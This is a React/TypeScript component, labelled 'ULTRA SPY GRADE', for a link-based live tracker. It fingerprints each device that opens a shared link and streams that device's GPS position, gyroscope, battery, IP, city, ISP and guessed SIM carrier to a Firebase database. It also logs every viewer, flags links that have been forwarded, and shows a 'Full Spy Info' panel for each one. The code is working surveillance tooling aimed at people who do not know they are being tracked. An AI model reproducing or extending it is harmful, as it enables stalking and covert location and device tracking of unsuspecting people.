/**
 * ██████████████████████████████████████████████████████████████
 * SENDER COMPONENT – LIVE TRACKER (v7.1 – ULTRA SPY GRADE + FORWARD DETECTION)
 * 
 * ✅ FIXED: TypeScript error on stopImmediatePropagation
 * ✅ All previous features preserved + full viewer history + click-to-view full device info
 * ✅ Works perfectly with the tracker page (multiple devices + locations)
 * ██████████████████████████████████████████████████████████████
 */

"use client";

import { useEffect, useRef, useState } from "react";
import { db } from "@/lib/firebase";
import {
  ref,
  update,
  onDisconnect,
  onValue,
  remove,
} from "firebase/database";
import {
  getDeviceInfo,
  startLiveOrientation,
  startLiveBattery,
  type DeviceInfo,
} from "@/lib/deviceDetector";

/* ---------------- TYPES ---------------- */

type Coords = {
  lat: number;
  lng: number;
  accuracy: number;
};

type IPInfo = {
  ip?: string;
  city?: string;
  region?: string;
  country?: string;
  isp?: string;
  as?: string;
};

type SimInfo = {
  carrier?: string;
  confidence?: number;
  method?: string;
};

type BatteryInfo = {
  level?: number;
  charging?: boolean;
  chargingTime?: number | null;
  dischargingTime?: number | null;
};

type NetworkInfo = {
  effectiveType?: string;
  downlink?: number;
  rtt?: number;
  saveData?: boolean;
  isp?: string;
  ipInfo?: IPInfo;
};

type OrientationData = {
  alpha?: number;
  beta?: number;
  gamma?: number;
  timestamp: number;
};

type Viewer = {
  viewerId: string;
  openedAt: number;
  lastSeen: number;
  device: DeviceInfo;
  coords?: Coords;
};

type Props = {
  sessionId: string;
};

export default function Sender({ sessionId }: Props) {
  const watchIdRef = useRef<number | null>(null);
  const heartbeatRef = useRef<NodeJS.Timeout | null>(null);
  const lastGpsUpdate = useRef<number>(0);
  const stopLiveOrientationRef = useRef<(() => void) | null>(null);
  const stopLiveBatteryRef = useRef<(() => void) | null>(null);

  const sessionRef = ref(db, `sessions/${sessionId}`);
  const viewersRef = ref(db, `sessions/${sessionId}/viewers`);
  const connectedRef = ref(db, ".info/connected");

  const [status, setStatus] = useState<
    "initializing" | "online" | "offline" | "error"
  >("initializing");

  const [coords, setCoords] = useState<Coords | null>(null);
  const [ping, setPing] = useState<number>(0);

  const [device, setDevice] = useState<DeviceInfo | null>(null);
  const [network, setNetwork] = useState<NetworkInfo | null>(null);
  const [battery, setBattery] = useState<BatteryInfo | null>(null);
  const [sim, setSim] = useState<SimInfo | null>(null);
  const [gyroActive, setGyroActive] = useState(false);

  const [viewers, setViewers] = useState<Viewer[]>([]);
  const [selectedViewer, setSelectedViewer] = useState<Viewer | null>(null);
  const [myViewerId, setMyViewerId] = useState<string>("");

  /* ---------------- FETCH ISP + SIM ---------------- */
  const fetchNetworkData = async (connectionType = "unknown", effectiveType = "unknown") => {
    try {
      const params = new URLSearchParams({ connectionType, effectiveType }).toString();
      const res = await fetch(`/api/isp?${params}`, { cache: "no-store" });
      if (!res.ok) throw new Error("ISP API failed");
      return await res.json();
    } catch (err) {
      console.error("ISP fetch failed:", err);
      return null;
    }
  };

  /* ---------------- UNIQUE VIEWER ID ---------------- */
  const generateViewerId = (dev: DeviceInfo): string => {
    const fp = `${dev.canvasFingerprint || ""}-${dev.webglFingerprint || ""}-${dev.audioFingerprint || ""}`;
    return btoa(fp + Date.now())
      .replace(/[^a-zA-Z0-9]/g, "")
      .slice(0, 16);
  };

  /* ---------------- INIT ---------------- */
  useEffect(() => {
    if (!sessionId || !navigator.geolocation) {
      setStatus("error");
      return;
    }

    /* 1. DEVICE INFO + CREATE VIEWER RECORD */
    (async () => {
      try {
        const info = await getDeviceInfo();
        setDevice(info);

        const viewerId = generateViewerId(info);
        setMyViewerId(viewerId);

        const viewerData: Partial<Viewer> = {
          viewerId,
          openedAt: Date.now(),
          lastSeen: Date.now(),
          device: info,
        };

        await update(ref(db, `sessions/${sessionId}/viewers/${viewerId}`), viewerData);
        await update(sessionRef, { device: info });
      } catch (err) {
        console.error("Device info capture failed:", err);
      }
    })();

    /* 2. LIVE GYROSCOPE */
    stopLiveOrientationRef.current = startLiveOrientation((gyro) => {
      const orientationData: OrientationData = {
        alpha: gyro.alpha,
        beta: gyro.beta,
        gamma: gyro.gamma,
        timestamp: Date.now(),
      };

      update(sessionRef, { orientation: orientationData, lastSeen: Date.now() });

      if (myViewerId) {
        update(ref(db, `sessions/${sessionId}/viewers/${myViewerId}`), {
          orientation: orientationData,
          lastSeen: Date.now(),
        });
      }

      setGyroActive(true);
    });

    /* 3. LIVE BATTERY */
    stopLiveBatteryRef.current = startLiveBattery((bat) => {
      const batInfo: BatteryInfo = {
        level: bat.batteryLevel,
        charging: bat.isCharging,
        chargingTime: bat.chargingTime,
        dischargingTime: bat.dischargingTime,
      };
      setBattery(batInfo);

      update(sessionRef, { battery: batInfo });

      if (myViewerId) {
        update(ref(db, `sessions/${sessionId}/viewers/${myViewerId}`), {
          battery: batInfo,
          lastSeen: Date.now(),
        });
      }
    });

    /* 4. NETWORK + ISP */
    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;

    const baseNetwork: NetworkInfo = conn
      ? {
          effectiveType: conn.effectiveType,
          downlink: conn.downlink,
          rtt: conn.rtt,
          saveData: conn.saveData,
        }
      : {};

    setNetwork(baseNetwork);

    const runNetwork = async () => {
      const data = await fetchNetworkData(conn?.type || "unknown", conn?.effectiveType || "unknown");
      if (!data) return;

      const net: NetworkInfo = {
        ...baseNetwork,
        isp: data.isp,
        ipInfo: {
          ip: data.ip,
          city: data.city,
          region: data.region,
          country: data.country,
          isp: data.isp,
          as: data.as,
        },
      };

      const simData: SimInfo = data.sim || null;

      setNetwork(net);
      setSim(simData);
      update(sessionRef, { network: net, sim: simData });
    };

    runNetwork();

    /* 5. PRESENCE + HEARTBEAT + GPS */
    onValue(connectedRef, (snap) => {
      if (snap.val()) {
        update(sessionRef, { status: "online", lastSeen: Date.now() });
        onDisconnect(sessionRef).update({ status: "offline", lastSeen: Date.now() });
        setStatus("online");
      } else {
        setStatus("offline");
      }
    });

    heartbeatRef.current = setInterval(async () => {
      const start = Date.now();
      try {
        await update(sessionRef, { heartbeat: start });
        const pingTime = Date.now() - start;
        setPing(pingTime);
        update(sessionRef, { pingMs: pingTime, lastSeen: Date.now() });

        if (myViewerId) {
          update(ref(db, `sessions/${sessionId}/viewers/${myViewerId}`), { lastSeen: Date.now() });
        }
      } catch {
        setPing(999);
      }
    }, 8000);

    watchIdRef.current = navigator.geolocation.watchPosition(
      (pos) => {
        const now = Date.now();
        if (now - lastGpsUpdate.current < 2000) return;
        lastGpsUpdate.current = now;

        const { latitude: lat, longitude: lng, accuracy } = pos.coords;
        const newCoords = { lat, lng, accuracy };
        setCoords(newCoords);
        setStatus("online");

        update(sessionRef, { lat, lng, accuracy, timestamp: now, lastSeen: now, status: "online" });

        if (myViewerId) {
          update(ref(db, `sessions/${sessionId}/viewers/${myViewerId}`), {
            coords: newCoords,
            lastSeen: now,
          });
        }
      },
      () => setStatus("offline"),
      { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
    );

    /* 6. LISTEN TO ALL VIEWERS */
    const unsubscribeViewers = onValue(viewersRef, (snap) => {
      const data = snap.val() as Record<string, Viewer> | null;
      if (!data) {
        setViewers([]);
        return;
      }
      const list = Object.values(data).sort((a, b) => b.lastSeen - a.lastSeen);
      setViewers(list);
    });

    /* CLEANUP */
    return () => {
      if (watchIdRef.current) navigator.geolocation.clearWatch(watchIdRef.current);
      if (heartbeatRef.current) clearInterval(heartbeatRef.current);
      if (stopLiveOrientationRef.current) stopLiveOrientationRef.current();
      if (stopLiveBatteryRef.current) stopLiveBatteryRef.current();
      if (unsubscribeViewers) unsubscribeViewers();
      update(sessionRef, { status: "offline", lastSeen: Date.now() });
    };
  }, [sessionId, myViewerId]);

  /* ---------------- HELPERS ---------------- */
  const uniqueViewersCount = viewers.length;
  const isForwarded = uniqueViewersCount > 1;

  const clearViewerHistory = async () => {
    if (!confirm("🛑 Delete ALL viewer history for this session?")) return;
    await remove(viewersRef);
  };

  const formatTime = (ts: number) => {
    const diff = Date.now() - ts;
    const sec = Math.floor(diff / 1000);
    if (sec < 60) return `${sec}s ago`;
    if (sec < 3600) return `${Math.floor(sec / 60)}m ago`;
    return `${Math.floor(sec / 3600)}h ago`;
  };

  /* ---------------- UI ---------------- */
  return (
    <div style={styles.container}>
      <h3>📡 Live Sender (v7.1 – Forward Detection Enabled)</h3>

      {/* Forward Detection Banner */}
      <div
        style={{
          padding: 12,
          borderRadius: 12,
          background: isForwarded ? "#ef4444" : "#22c55e",
          color: "white",
          marginBottom: 16,
          textAlign: "center",
          fontWeight: 700,
        }}
      >
        {isForwarded
          ? `🚨 LINK FORWARDED – ${uniqueViewersCount} devices opened this link`
          : `✅ Only you have opened this link so far`}
      </div>

      <p>
        Status: <strong>{status}</strong> • Ping: {ping} ms
      </p>

      {gyroActive && <p style={{ color: "#10b981", fontWeight: 600 }}>📡 Gyroscope LIVE (real-time tilt tracking)</p>}

      {coords && (
        <p>
          📍 GPS: {coords.lat.toFixed(4)}, {coords.lng.toFixed(4)} (±{Math.round(coords.accuracy)}m)
        </p>
      )}

      {network?.ipInfo && (
        <div style={{ marginTop: 12 }}>
          <p>🌐 IP: {network.ipInfo.ip}</p>
          <p>📍 City: {network.ipInfo.city}</p>
          <p>🌍 Country: {network.ipInfo.country}</p>
          <p style={{ fontWeight: 600 }}>ISP: {network.isp}</p>
        </div>
      )}

      {sim && (
        <div style={{ marginTop: 12 }}>
          <p style={{ fontWeight: 600 }}>📶 SIM: {sim.carrier || "Unknown"}</p>
          <p style={{ opacity: 0.7 }}>
            Confidence: {sim.confidence}%{" "}
            {sim.method && <span style={{ fontSize: "0.8em", marginLeft: 8 }}>({sim.method})</span>}
          </p>
        </div>
      )}

      {battery && (
        <p>
          🔋 Battery: {battery.level !== undefined ? Math.round(battery.level * 100) : "?"}%
          {battery.charging ? " ⚡ charging" : ""}
          {battery.chargingTime !== null && battery.charging && (
            <span style={{ marginLeft: 8, fontSize: 13 }}>
              (full in ~{Math.round((battery.chargingTime || 0) / 60)} min)
            </span>
          )}
        </p>
      )}

      {device && (
        <div style={{ marginTop: 12 }}>
          <p>
            📱 Device: <strong>{device.brand} {device.model}</strong>
          </p>
          <p>OS: {device.os} {device.osVersion || ""}</p>
        </div>
      )}

      {/* VIEWER HISTORY */}
      <div style={{ marginTop: 24 }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
          <h4>👥 Devices That Opened This Link ({uniqueViewersCount})</h4>
          <button
            onClick={clearViewerHistory}
            style={{
              background: "#ef4444",
              color: "white",
              border: "none",
              padding: "6px 14px",
              borderRadius: 9999,
              fontSize: 13,
              cursor: "pointer",
            }}
          >
            🗑️ Clear History
          </button>
        </div>

        {viewers.length === 0 ? (
          <p style={{ opacity: 0.6, fontSize: 14 }}>Waiting for devices...</p>
        ) : (
          viewers.map((v) => (
            <div
              key={v.viewerId}
              onClick={() => setSelectedViewer(v)}
              style={{
                padding: 12,
                background: "#1e2937",
                borderRadius: 12,
                marginBottom: 8,
                cursor: "pointer",
                transition: "all 0.2s",
              }}
            >
              <div style={{ display: "flex", justifyContent: "space-between" }}>
                <strong>
                  {v.device.brand} {v.device.model}
                </strong>
                <span style={{ fontSize: 13, opacity: 0.7 }}>{formatTime(v.lastSeen)}</span>
              </div>
              <p style={{ fontSize: 13, margin: 0, opacity: 0.8 }}>
                Battery {v.device.batteryLevel !== undefined ? Math.round(v.device.batteryLevel * 100) : "?"}%
                {v.coords && (
                  <span style={{ marginLeft: 12 }}>
                    📍 {v.coords.lat.toFixed(3)}, {v.coords.lng.toFixed(3)}
                  </span>
                )}
              </p>
            </div>
          ))
        )}
      </div>

      {/* FULL DEVICE MODAL – FIXED CLICK HANDLER */}
      {selectedViewer && (
        <div
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(0,0,0,0.9)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            zIndex: 9999,
          }}
          onClick={() => setSelectedViewer(null)}
        >
          <div
            style={{
              background: "#111827",
              padding: 24,
              borderRadius: 20,
              maxWidth: 480,
              width: "90%",
              maxHeight: "90vh",
              overflowY: "auto",
            }}
            onClick={(e) => e.stopPropagation()}   
          >
            <h3>🕵️‍♂️ Full Spy Info – {selectedViewer.device.brand} {selectedViewer.device.model}</h3>
            <pre
              style={{
                background: "#1e2937",
                padding: 16,
                borderRadius: 12,
                fontSize: 13,
                whiteSpace: "pre-wrap",
                overflowX: "auto",
              }}
            >
              {JSON.stringify(selectedViewer.device, null, 2)}
            </pre>
            {selectedViewer.coords && (
              <p style={{ marginTop: 12 }}>
                📍 Last known location: {selectedViewer.coords.lat.toFixed(4)},{" "}
                {selectedViewer.coords.lng.toFixed(4)}
              </p>
            )}
            <button
              onClick={() => setSelectedViewer(null)}
              style={{
                marginTop: 20,
                width: "100%",
                padding: 14,
                background: "#22c55e",
                color: "white",
                border: "none",
                borderRadius: 9999,
              }}
            >
              Close
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

const styles: Record<string, React.CSSProperties> = {
  container: {
    padding: 20,
    background: "#0f172a",
    color: "white",
    borderRadius: 16,
    maxWidth: 460,
    margin: "20px auto",
    fontFamily: "system-ui, sans-serif",
    lineHeight: 1.6,
    boxShadow: "0 10px 30px rgba(0,0,0,0.3)",
  },
};